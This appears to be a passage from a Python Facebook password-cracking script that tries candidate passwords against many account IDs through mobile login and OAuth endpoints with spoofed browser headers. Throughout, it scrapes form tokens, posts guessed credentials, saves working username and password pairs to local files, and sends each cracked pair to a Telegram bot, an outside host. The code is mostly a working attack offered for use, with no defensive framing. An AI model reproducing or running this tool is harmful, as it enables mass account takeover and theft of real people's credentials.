	amr=rc(['😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❣️','💕','💞','💓','💗','💖','💘','💝','💟','❤️‍🔥','❤️‍🩹','❤️','🚀','🛸','🌍','🌎','🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆','🧑🏻‍💻','✨','🗿','👍🏼','🚬','🐸','👀','🤚🏻','🔪','🤞🏼','✋🏼','🐍','🦉','🦅'])
	print('\r[ANES-🖤] %s/%s •_• [𝐎𝐊] %s •_• [𝐂𝐏] %s •_• %s]%s'%(bi,amr,loop,len(id),ok,cp,amr,x), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				statuscp = f'''ғᴀᴄᴇʙᴏᴏᴋ❌
𖣘────━𓆩𝗔𝗟𝗥𝗢𝗦𝗘𓆪━────𖣘
✵ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}
✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
𖣘────━𓆩𝗔𝗟𝗥𝗢𝗦𝗘𓆪━────𖣘
⊊𝗕𝗬⊋ ➩ @YRWSYY @WDEH_ALROSE
					'''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title='WdeH'))
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				statusok = f'''ғᴀᴄᴇʙᴏᴏᴋ✔️🔥
𖣘────━𓆩𝗔𝗟𝗥𝗢𝗦𝗘𓆪━────𖣘
✵ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}
✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
𖣘────━𓆩𝗔𝗟𝗥𝗢𝗦𝗘𓆪━────𖣘
⊊𝗕𝗬⊋ ➩ @YRWSYY - @WDEH_ALROSE'''
				statusok1 = nel(statusok, style='green')
				cetak(nel(statusok1, title=' WdeH'))
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('mobile .prox.txt')
    except:pass
main_menu()